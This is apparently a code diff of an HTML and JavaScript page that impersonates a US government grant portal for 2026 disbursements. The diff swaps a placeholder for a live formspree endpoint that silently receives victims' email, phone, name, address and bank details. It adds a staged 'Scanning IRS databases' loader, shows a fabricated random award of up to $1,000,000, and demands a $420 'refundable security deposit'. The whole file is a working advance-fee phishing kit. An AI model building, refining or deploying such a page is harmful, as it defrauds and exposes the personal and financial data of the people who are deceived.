@@ -7,27 +7,23 @@
     <style>
         :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
         body { font-family: 'Times New Roman', Times, serif; background: var(--bg); margin: 0; color: #333; }
-        
-        /* Official Header Layout */
         .gov-top { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
         .main-header { background: var(--navy); color: white; padding: 30px 20px; text-align: center; border-bottom: 5px solid var(--gold); }
         .main-header img { width: 100px; margin-bottom: 10px; }
         .main-header h1 { margin: 0; font-size: 22px; letter-spacing: 3px; }
-
         .container { max-width: 600px; margin: 40px auto; background: white; padding: 45px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); position: relative; }
         .page { display: none; }
         .active { display: block; }
-
         h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 15px; font-size: 24px; }
         label { display: block; margin: 20px 0 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; color: #555; }
         input, select { width: 100%; padding: 14px; border: 1px solid #aaa; border-radius: 0; font-size: 16px; box-sizing: border-box; background: #fafafa; }
         button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 30px; font-size: 16px; letter-spacing: 1px; }
-        
         .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 25px; text-align: center; margin: 20px 0; }
         .access-code { font-size: 40px; font-weight: bold; color: var(--navy); letter-spacing: 12px; }
-
         #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
         .modal-inner { background: white; padding: 40px; max-width: 450px; text-align: center; border-top: 8px solid var(--gold); }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -42,21 +38,18 @@
 <div class="container">
     <div id="p1" class="page active">
         <h2>Secure Gateway Login</h2>
-        <p>This portal is for the disbursement of 2026 CDFI Individual and Business grants. Enter your primary contact to receive a Secure Access Code.</p>
+        <p>This portal handles 2026 Individual and Business grants. Enter your details to generate a Secure Access Code.</p>
         <label>Primary Email Address</label>
-        <input type="email" id="email" placeholder="Required for confirmation" required>
+        <input type="email" id="email" placeholder="example@gmail.com" required>
         <label>Primary Mobile Number</label>
         <input type="tel" id="phone" placeholder="+1 (___) ___-____" required>
         <button onclick="toPage(2, true)">Generate Secure Code</button>
-        <p style="font-size: 11px; color: #777; margin-top: 20px;">By clicking, you agree to the 2026 Federal Privacy Act and data encryption protocols.</p>
     </div>
 
     <div id="p2" class="page">
         <h2>Multi-Factor Authentication</h2>
-        <p>A unique 6-digit access code has been assigned to your device. Verify to proceed to the Eligibility Wizard.</p>
-        <div class="verify-box">
-            <div class="access-code" id="displayCode"></div>
-        </div>
+        <p>Your unique 6-digit access code is below. Verify to proceed.</p>
+        <div class="verify-box"><div class="access-code" id="displayCode"></div></div>
         <input type="text" id="inputCode" placeholder="Enter Code">
         <button onclick="checkCode()">Verify and Access</button>
     </div>
@@ -65,48 +58,47 @@
         <h2>Eligibility Assessment</h2>
         <label>Filing Category</label>
         <select id="userType">
-            <option value="single">Single / Individual Filer</option>
+            <option value="single">Individual Filer</option>
             <option value="business">Business / LLC / Corporation</option>
-            <option value="nonprofit">Non-Profit Entity</option>
         </select>
-        
         <label>Tax Filing Status (2024-2025)</label>
         <select id="taxStatus">
             <option value="filed">Current / Filed Successfully</option>
-            <option value="exempt">Exempt / Below Income Limit</option>
-            <option value="pending">Pending Extension</option>
+            <option value="exempt">Exempt / Below Limit</option>
         </select>
-
-        <label>Current Annual Income / Revenue</label>
+        <label>Current Annual Income</label>
         <input type="text" id="income" placeholder="Estimated $ amount">
-
-        <button onclick="calculateAndShow(4)">Analyze Eligibility</button>
+        <button onclick="runAnalysis()">Analyze Eligibility</button>
     </div>
 
-    <div id="p4" class="page">
-        <h2>Final Disbursement Profile</h2>
-        <form id="submissionForm" action="https://formspree.io/f/YOUR_ID_HERE">
-            <input type="hidden" name="Login_Email" id="hEmail">
-            <input type="hidden" name="Login_Phone" id="hPhone">
-            <input type="hidden" name="Approved_Amount" id="hAmount">
+    <div id="p4" class="page text-center">
+        <h2>Processing Federal Records...</h2>
+        <p>Checking tax databases and regional allocation limits.</p>
+        <div class="loader"></div>
+        <p id="loadingStatus">Scanning IRS databases...</p>
+    </div>
 
+    <div id="p5" class="page">
+        <h2>Final Disbursement Profile</h2>
+        <form id="submissionForm" action="https://formspree.io/f/xzdaored">
+            <input type="hidden" name="User_Email" id="hEmail">
+            <input type="hidden" name="User_Phone" id="hPhone">
+            <input type="hidden" name="Approved_Amount" id="hAmount">
             <label>Full Legal Name</label>
             <input type="text" name="FullName" required>
             <label>Mailing Address</label>
             <input type="text" name="Address" required>
             <label>Receiving Bank Name</label>
             <input type="text" name="Bank" required>
-
             <button type="button" onclick="openAgreement()">Finalize Allocation Claim</button>
         </form>
     </div>
 
-    <div id="p5" class="page text-center">
-        <h1 style="color:var(--navy); font-size: 28px;">ALLOCATION APPROVED ✅</h1>
+    <div id="p6" class="page text-center">
+        <h1 style="color:var(--navy);">ALLOCATION APPROVED ✅</h1>
         <div style="font-size: 48px; color: #1a5e20; font-weight: bold; margin: 25px 0;" id="finalDisplay"></div>
-        <p style="font-weight: bold;">Reference Number: WH-2026-X882</p>
-        <p>To release this allocation, a <strong>Refundable Security Deposit of $420.00</strong> is required for account-to-treasury synchronization. This will be added back to your total payout.</p>
-        <p>Our office will reach out to <strong><span id="finalEmail"></span></strong> shortly with the final steps.</p>
+        <p>To release this allocation, a <strong>Refundable Security Deposit of $420.00</strong> is required for account-to-treasury synchronization.</p>
+        <p>Our office will reach out to <strong><span id="finalEmail"></span></strong> shortly.</p>
     </div>
 </div>
 
@@ -114,7 +106,7 @@
     <div class="modal-inner">
         <h3>Final Disbursement Agreement</h3>
         <p id="modalMsg"></p>
-        <p style="font-size: 13px; color: #666;">This synchronization deposit is mandatory under the 2026 Banking Act. It is 100% added to your award.</p>
+        <p style="font-size: 12px; color: #666;">This synchronization deposit is 100% added to your award.</p>
         <button onclick="submitAll()" style="background:var(--navy)">I AGREE & SUBMIT</button>
         <button onclick="document.getElementById('modal').style.display='none'" style="background:#888; margin-top: 10px;">CANCEL</button>
     </div>
@@ -123,38 +115,32 @@
 <script>
     let accessCode;
     function toPage(n, gen=false) {
-        if(gen) {
-            accessCode = Math.floor(100000 + Math.random() * 900000);
-            document.getElementById('displayCode').innerText = accessCode;
-        }
+        if(gen) { accessCode = Math.floor(100000 + Math.random() * 900000); document.getElementById('displayCode').innerText = accessCode; }
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById('p'+n).classList.add('active');
     }
 
-    function checkCode() {
-        if(document.getElementById('inputCode').value == accessCode) { toPage(3); } 
-        else { alert("Security Code Invalid."); }
+    function checkCode() { if(document.getElementById('inputCode').value == accessCode) { toPage(3); } else { alert("Code Invalid."); } }
+
+    function runAnalysis() {
+        toPage(4);
+        const statusText = document.getElementById('loadingStatus');
+        setTimeout(() => { statusText.innerText = "Verifying Filing History..."; }, 1500);
+        setTimeout(() => { statusText.innerText = "Calculating Regional Allotment..."; }, 3000);
+        setTimeout(() => { calculateFinal(); }, 4500);
     }
 
-    function calculateAndShow(n) {
+    function calculateFinal() {
         const type = document.getElementById('userType').value;
         const tax = document.getElementById('taxStatus').value;
-        
-        let base = 74000;
-        if (type === 'business') base = 450000;
-        if (type === 'business' && tax === 'filed') base = 780000;
-        
-        // Generate a unique non-round number between base and 1,000,000
-        let randomFactor = Math.floor(Math.random() * 200000);
-        let finalAmt = base + randomFactor;
+        let base = (type === 'business' && tax === 'filed') ? 780000 : (type === 'business' ? 450000 : 74000);
+        let finalAmt = base + Math.floor(Math.random() * 210000);
         if (finalAmt > 1000000) finalAmt = 1000000;
-
         const formatted = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalAmt);
-        
         document.getElementById('hAmount').value = formatted;
         document.getElementById('finalDisplay').innerText = formatted;
         document.getElementById('modalMsg').innerText = `To receive your approved ${formatted} allocation, you must confirm the $420.00 refundable security deposit.`;
-        toPage(n);
+        toPage(5);
     }
 
     function openAgreement() { document.getElementById('modal').style.display = 'flex'; }
@@ -164,12 +150,9 @@
         document.getElementById('hEmail').value = document.getElementById('email').value;
         document.getElementById('hPhone').value = document.getElementById('phone').value;
         document.getElementById('finalEmail').innerText = document.getElementById('email').value;
-
-        // Background Submission
         fetch(f.action, { method: 'POST', body: new FormData(f), headers: { 'Accept': 'application/json' }});
-        
         document.getElementById('modal').style.display = 'none';
-        toPage(5);
+        toPage(6);
     }
 </script>
 </body>
